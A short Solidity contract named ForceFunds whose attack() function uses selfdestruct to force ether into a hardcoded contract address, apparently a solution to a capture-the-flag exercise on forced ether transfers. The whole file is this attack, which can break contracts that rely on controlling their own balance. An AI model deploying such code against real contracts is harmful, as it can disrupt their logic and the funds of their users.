// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceFunds {
    
    address payable toContract = payable(0x4964883B11CB57c93c590287FefF1B3Ce963A57f);
    
    function attack() public payable {
        require(msg.value > 0); // require that a value is specified

        selfdestruct(toContract); // this deletes the contract and sends ether to the address specified
    }
}